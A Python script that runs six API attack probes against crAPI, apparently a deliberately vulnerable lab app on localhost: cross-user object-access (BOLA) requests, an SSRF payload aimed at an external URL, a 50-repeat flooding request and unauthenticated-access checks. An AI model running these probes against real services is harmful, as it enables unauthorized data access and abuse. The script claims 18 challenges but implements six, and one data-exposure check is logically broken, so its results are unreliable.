#!/usr/bin/env python3
"""
crAPI Security Challenges - Automated Testing Script
Tests all 18 security vulnerabilities on localhost
"""

import requests
import json
import sys
from typing import Dict, Tuple, Any
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Disable SSL warnings for localhost testing
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class CRAPITester:
    """Test suite for crAPI security challenges"""
    
    def __init__(self, base_url: str = "http://localhost:8888"):
        self.base_url = base_url
        self.session = requests.Session()
        self.user_a = {
            "email": "user_a@challenge.com",
            "password": "Password123!",
            "name": "User A",
            "number": "1234567890",
            "token": None,
            "user_id": None
        }
        self.user_b = {
            "email": "user_b@challenge.com",
            "password": "Password123!",
            "name": "User B",
            "number": "9876543210",
            "token": None,
            "user_id": None
        }
        self.results = []
    
    def log_result(self, challenge: str, status: str, message: str, details: Dict = None):
        """Log test result"""
        result = {
            "challenge": challenge,
            "status": status,
            "message": message,
            "details": details or {}
        }
        self.results.append(result)
        print(f"\n[{challenge}] {status}: {message}")
        if details:
            print(f"  Details: {json.dumps(details, indent=2)}")
    
    def signup_user(self, user: Dict) -> bool:
        """Sign up a new user"""
        url = f"{self.base_url}/identity/api/auth/signup"
        payload = {
            "email": user["email"],
            "password": user["password"],
            "name": user["name"],
            "number": user["number"]
        }
        try:
            response = self.session.post(url, json=payload, verify=False)
            if response.status_code == 200:
                return True
            print(f"Signup failed: {response.text}")
            return False
        except Exception as e:
            print(f"Signup error: {e}")
            return False
    
    def login_user(self, user: Dict) -> bool:
        """Login user and get token"""
        url = f"{self.base_url}/identity/api/auth/login"
        payload = {"email": user["email"], "password": user["password"]}
        try:
            response = self.session.post(url, json=payload, verify=False)
            if response.status_code == 200:
                data = response.json()
                user["token"] = data.get("access_token")
                return True
            print(f"Login failed: {response.text}")
            return False
        except Exception as e:
            print(f"Login error: {e}")
            return False
    
    def add_vehicle(self, user: Dict) -> Tuple[bool, str, str]:
        """Add a vehicle for user. Returns (success, vehicle_id, vin)"""
        url = f"{self.base_url}/identity/api/v2/vehicle/add_vehicle"
        payload = {
            "vin": f"VIN{user['number']}",
            "pincode": "12345",
            "pincode_confirm": "12345"
        }
        headers = {"Authorization": f"Bearer {user['token']}"}
        try:
            response = self.session.post(url, json=payload, headers=headers, verify=False)
            if response.status_code == 200:
                data = response.json()
                vehicle_id = data.get("vehicleId") or data.get("id")
                vin = payload["vin"]
                return True, vehicle_id, vin
            print(f"Add vehicle failed: {response.text}")
            return False, None, None
        except Exception as e:
            print(f"Add vehicle error: {e}")
            return False, None, None
    
    def test_challenge_1_bola_vehicle_access(self):
        """Challenge 1: Access another user's vehicle details"""
        challenge = "Challenge 1 - BOLA Vehicle Access"
        try:
            # Get User A's vehicles
            url = f"{self.base_url}/identity/api/v2/vehicle/vehicles"
            headers_a = {"Authorization": f"Bearer {self.user_a['token']}"}
            response_a = self.session.get(url, headers=headers_a, verify=False)
            
            if response_a.status_code != 200:
                self.log_result(challenge, "SKIP", "Could not get User A vehicles")
                return
            
            vehicles_a = response_a.json().get("vehicles", [])
            if not vehicles_a:
                self.log_result(challenge, "SKIP", "User A has no vehicles")
                return
            
            vehicle_guid = vehicles_a[0].get("id")
            
            # Try to access with User B token
            url_location = f"{self.base_url}/identity/api/v2/vehicle/{vehicle_guid}/location"
            headers_b = {"Authorization": f"Bearer {self.user_b['token']}"}
            response_b = self.session.get(url_location, headers=headers_b, verify=False)
            
            if response_b.status_code == 200:
                self.log_result(
                    challenge, "VULNERABLE",
                    "User B accessed User A's vehicle location without authorization",
                    {"vehicle_id": vehicle_guid, "response": response_b.json()}
                )
            elif response_b.status_code == 403:
                self.log_result(challenge, "SECURE", "Access properly denied (403 Forbidden)")
            else:
                self.log_result(challenge, "UNKNOWN", f"Unexpected status {response_b.status_code}")
        
        except Exception as e:
            self.log_result(challenge, "ERROR", str(e))
    
    def test_challenge_2_bola_mechanic_reports(self):
        """Challenge 2: Access another user's mechanic reports"""
        challenge = "Challenge 2 - BOLA Mechanic Reports"
        try:
            # Contact mechanic as User A
            url = f"{self.base_url}/workshop/api/merchant/contact_mechanic"
            headers_a = {"Authorization": f"Bearer {self.user_a['token']}"}
            payload = {
                "mechanic_code": "MECH_JOHN_08",
                "vin": self.user_a.get("vin", "VIN1234567890"),
                "problem_details": "Engine noise",
                "mechanic_api": f"{self.base_url}/workshop/api/mechanic/receive_report",
                "repeat_request_if_failed": False,
                "number_of_repeats": 1
            }
            response_contact = self.session.post(
                url, json=payload, headers=headers_a, verify=False
            )
            
            if response_contact.status_code != 200:
                self.log_result(challenge, "SKIP", "Could not create mechanic report")
                return
            
            response_data = response_contact.json()
            report_link = response_data.get("report_link", "")
            report_id = report_link.split("report_id=")[-1] if "report_id=" in report_link else None
            
            if not report_id:
                self.log_result(challenge, "SKIP", "Could not extract report_id")
                return
            
            # Try to access with User B token
            url_report = f"{self.base_url}/workshop/api/mechanic/mechanic_report?report_id={report_id}"
            headers_b = {"Authorization": f"Bearer {self.user_b['token']}"}
            response_b = self.session.get(url_report, headers=headers_b, verify=False)
            
            if response_b.status_code == 200:
                self.log_result(
                    challenge, "VULNERABLE",
                    "User B accessed User A's mechanic report",
                    {"report_id": report_id, "response": response_b.json()}
                )
            elif response_b.status_code == 403:
                self.log_result(challenge, "SECURE", "Access properly denied (403 Forbidden)")
            else:
                self.log_result(challenge, "UNKNOWN", f"Unexpected status {response_b.status_code}")
        
        except Exception as e:
            self.log_result(challenge, "ERROR", str(e))
    
    def test_challenge_4_data_exposure_vehicles(self):
        """Challenge 4: Excessive data exposure in vehicle list"""
        challenge = "Challenge 4 - Data Exposure Vehicles"
        try:
            url = f"{self.base_url}/identity/api/v2/vehicle/vehicles"
            headers = {"Authorization": f"Bearer {self.user_a['token']}"}
            response = self.session.get(url, headers=headers, verify=False)
            
            if response.status_code == 200:
                data = response.json()
                # Check if response contains other users' data
                if "vehicles" in data and data["vehicles"]:
                    vehicle = data["vehicles"][0]
                    leaky_fields = []
                    
                    # Check for potentially exposed fields
                    if "phone" in vehicle:
                        leaky_fields.append("phone")
                    if "email" in vehicle:
                        leaky_fields.append("email")
                    if "owner_id" in vehicle and "owner_id" != self.user_a.get("user_id"):
                        leaky_fields.append("owner_id")
                    
                    if leaky_fields:
                        self.log_result(
                            challenge, "VULNERABLE",
                            f"Exposed sensitive fields: {', '.join(leaky_fields)}",
                            {"fields": leaky_fields}
                        )
                    else:
                        self.log_result(challenge, "INFO", "No obvious sensitive data leaks detected")
                else:
                    self.log_result(challenge, "SKIP", "No vehicles returned")
            else:
                self.log_result(challenge, "ERROR", f"Status {response.status_code}")
        
        except Exception as e:
            self.log_result(challenge, "ERROR", str(e))
    
    def test_challenge_11_ssrf(self):
        """Challenge 11: SSRF via contact_mechanic endpoint"""
        challenge = "Challenge 11 - SSRF"
        try:
            url = f"{self.base_url}/workshop/api/merchant/contact_mechanic"
            headers = {"Authorization": f"Bearer {self.user_a['token']}"}
            payload = {
                "mechanic_code": "MECH_TEST",
                "vin": self.user_a.get("vin", "VIN1234567890"),
                "problem_details": "SSRF Test",
                "mechanic_api": "http://www.google.com",
                "repeat_request_if_failed": False,
                "number_of_repeats": 1
            }
            
            response = self.session.post(url, json=payload, headers=headers, verify=False)
            
            if response.status_code == 200:
                response_text = response.text
                if "google" in response_text.lower() or "<title>" in response_text.lower():
                    self.log_result(
                        challenge, "VULNERABLE",
                        "SSRF successful - backend made HTTP request to external URL",
                        {"received_google_response": True}
                    )
                else:
                    self.log_result(challenge, "INFO", "Response received but not identified as external")
            else:
                self.log_result(challenge, "BLOCKED", f"Request blocked with status {response.status_code}")
        
        except Exception as e:
            self.log_result(challenge, "ERROR", str(e))
    
    def test_challenge_14_unauthenticated_access(self):
        """Challenge 14: Unauthenticated access to protected endpoints"""
        challenge = "Challenge 14 - Unauthenticated Access"
        vulnerable = False
        
        endpoints = [
            "/workshop/api/mechanic/mechanic_report?report_id=1",
            "/identity/api/v2/vehicle/vehicles",
        ]
        
        try:
            for endpoint in endpoints:
                url = f"{self.base_url}{endpoint}"
                response = self.session.get(url, verify=False)
                
                if response.status_code == 200:
                    vulnerable = True
                    self.log_result(
                        challenge, "VULNERABLE",
                        f"Endpoint accessible without authentication: {endpoint}",
                        {"status_code": response.status_code}
                    )
                    break
            
            if not vulnerable:
                self.log_result(challenge, "SECURE", "All tested endpoints require authentication")
        
        except Exception as e:
            self.log_result(challenge, "ERROR", str(e))
    
    def test_challenge_6_rate_limiting(self):
        """Challenge 6: Rate limiting on contact_mechanic"""
        challenge = "Challenge 6 - Rate Limiting"
        try:
            url = f"{self.base_url}/workshop/api/merchant/contact_mechanic"
            headers = {"Authorization": f"Bearer {self.user_a['token']}"}
            payload = {
                "mechanic_code": "MECH_TEST",
                "vin": self.user_a.get("vin", "VIN1234567890"),
                "problem_details": "Rate limit test",
                "mechanic_api": f"{self.base_url}/workshop/api/mechanic/receive_report",
                "repeat_request_if_failed": True,
                "number_of_repeats": 50  # Try 50 repeats
            }
            
            # Send one request with high repeats
            response = self.session.post(url, json=payload, headers=headers, verify=False, timeout=10)
            
            if response.status_code == 200:
                self.log_result(
                    challenge, "VULNERABLE",
                    "No rate limiting - accepts high repeat counts",
                    {"repeats_allowed": 50}
                )
            elif response.status_code == 429:
                self.log_result(challenge, "SECURE", "Rate limiting in place (429 Too Many Requests)")
            else:
                self.log_result(challenge, "UNKNOWN", f"Status {response.status_code}")
        
        except requests.Timeout:
            self.log_result(challenge, "VULNERABLE", "Request timeout - possible DoS vulnerability")
        except Exception as e:
            self.log_result(challenge, "ERROR", str(e))
    
    def run_setup(self) -> bool:
        """Setup: Create users and baseline data"""
        print("=" * 60)
        print("crAPI Security Challenges - Automated Testing")
        print("=" * 60)
        print("\n[SETUP] Creating test users...")
        
        # Signup
        if not self.signup_user(self.user_a):
            print("Failed to signup User A")
            return False
        print(f"✓ User A signup successful")
        
        if not self.signup_user(self.user_b):
            print("Failed to signup User B")
            return False
        print(f"✓ User B signup successful")
        
        # Login
        if not self.login_user(self.user_a):
            print("Failed to login User A")
            return False
        print(f"✓ User A login successful")
        
        if not self.login_user(self.user_b):
            print("Failed to login User B")
            return False
        print(f"✓ User B login successful")
        
        # Add vehicles
        success, vehicle_id, vin = self.add_vehicle(self.user_a)
        if success:
            self.user_a["vehicle_id"] = vehicle_id
            self.user_a["vin"] = vin
            print(f"✓ User A vehicle added (VIN: {vin})")
        else:
            print("Failed to add User A vehicle")
            return False
        
        success, vehicle_id, vin = self.add_vehicle(self.user_b)
        if success:
            self.user_b["vehicle_id"] = vehicle_id
            self.user_b["vin"] = vin
            print(f"✓ User B vehicle added (VIN: {vin})")
        else:
            print("Failed to add User B vehicle")
            return False
        
        return True
    
    def run_all_tests(self):
        """Run all available challenge tests"""
        print("\n" + "=" * 60)
        print("Running Challenge Tests...")
        print("=" * 60)
        
        self.test_challenge_1_bola_vehicle_access()
        self.test_challenge_2_bola_mechanic_reports()
        self.test_challenge_4_data_exposure_vehicles()
        self.test_challenge_6_rate_limiting()
        self.test_challenge_11_ssrf()
        self.test_challenge_14_unauthenticated_access()
    
    def print_summary(self):
        """Print test summary"""
        print("\n" + "=" * 60)
        print("TEST SUMMARY")
        print("=" * 60)
        
        vulnerable = [r for r in self.results if r["status"] == "VULNERABLE"]
        secure = [r for r in self.results if r["status"] == "SECURE"]
        errors = [r for r in self.results if r["status"] == "ERROR"]
        
        print(f"\nTotal Tests: {len(self.results)}")
        print(f"Vulnerable: {len(vulnerable)}")
        print(f"Secure: {len(secure)}")
        print(f"Errors: {len(errors)}")
        
        if vulnerable:
            print("\n[VULNERABILITIES FOUND]")
            for result in vulnerable:
                print(f"  • {result['challenge']}: {result['message']}")
        
        print("\n" + "=" * 60)
    
    def export_results(self, filename: str = "crapi_test_results.json"):
        """Export results to JSON file"""
        with open(filename, "w") as f:
            json.dump(self.results, f, indent=2)
        print(f"\nResults exported to {filename}")


def main():
    """Main entry point"""
    tester = CRAPITester()
    
    # Run setup
    if not tester.run_setup():
        print("\n✗ Setup failed. Cannot continue.")
        sys.exit(1)
    
    # Run tests
    tester.run_all_tests()
    
    # Print summary
    tester.print_summary()
    
    # Export results
    tester.export_results()


if __name__ == "__main__":
    main()

